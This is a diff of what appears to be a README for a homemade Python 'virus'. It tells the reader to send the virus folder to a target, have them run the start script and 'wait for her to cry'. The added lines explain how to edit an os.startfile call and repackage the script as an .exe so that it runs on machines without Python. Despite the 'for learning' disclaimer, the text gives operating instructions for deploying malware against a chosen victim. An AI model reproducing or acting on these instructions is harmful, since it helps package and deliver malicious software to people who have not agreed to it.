@@ -23,3 +23,17 @@ This is a Python file for learning and do not run this file on your system at al
 First send the folder (Virus) to your target and tell it to run the script (start virus .py). And wait for her to cry! :)
 
 Note that you must send or open the contents of the folder (Virus) without change.
+
+
+
+# What if our goal is not Python?
+
+Go to the folder code (start virus .py) and in line 24 of this code change this os.startfile ("b.py") to this code os.startfile ("X .exe")
+And you have to change the folder (b.py) to the .exe file and rename it to X.
+And convert the file (start virus .py) to a file (S.exe).
+
+The next way
+
+Go to the folder code (start virus .py) and delete on line 24
+Delete the folder (b.py)
+Convert the folder (start virus .py) to a file (S.exe). (This will reduce the virus power)
